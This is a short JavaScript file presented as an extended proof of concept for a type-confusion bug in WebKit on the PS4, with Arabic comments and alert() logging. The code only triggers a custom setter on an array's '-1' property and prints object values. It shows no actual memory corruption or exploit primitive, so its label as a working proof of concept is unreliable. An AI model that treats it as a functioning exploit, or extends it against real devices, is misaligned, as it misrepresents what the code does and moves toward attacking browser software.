// Extended POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 100;

let OBJ = { a: 41 };
OBJ.a = 42;
let TARGET = { secret: 0x12345678, extra: 0x87654321 };
let OTHER = { value: 0xdeadbeef }; // كائن إضافي لمراقبته

function f(obj, idx, targetAddr) {
    let v = OBJ.a;
    alert('Before write, OBJ.a = ' + OBJ.a);
    obj[idx] = v;
    if (targetAddr && idx === -1) {
        try {
            obj[-1] = targetAddr;
            alert('Attempted to write TARGET address to obj[-1]: ' + targetAddr);
        } catch (e) {
            alert('Error writing to obj[-1]: ' + e);
        }
    }
    alert('After write, OBJ.a = ' + OBJ.a);
    return OBJ.a;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        let isLastIteration = i === NUM_ITERATIONS - 1;
        let idx = isLastIteration ? -1 : ARRAY_LENGTH;

        let obj = new Array(ARRAY_LENGTH);
        Object.defineProperty(obj, '-1', {
            set(value) {
                alert('Setter triggered for value ' + value + ', changing OBJ.a to 1337');
                OBJ.a = 1337;
            }
        });

        for (let j = 0; j < ARRAY_LENGTH; j++) {
            if (j === ARRAY_LENGTH / 2) continue;
            obj[j] = j;
        }

        let r = f(obj, idx, isLastIteration ? TARGET : null);
        alert('Iteration ' + i + ': Result = ' + r);
    }
    alert('Final OBJ.a = ' + OBJ.a);
    alert('TARGET.secret = ' + TARGET.secret);
    alert('TARGET.extra = ' + TARGET.extra);
    alert('OTHER.value = ' + OTHER.value); // تحقق من كائن آخر
}

main();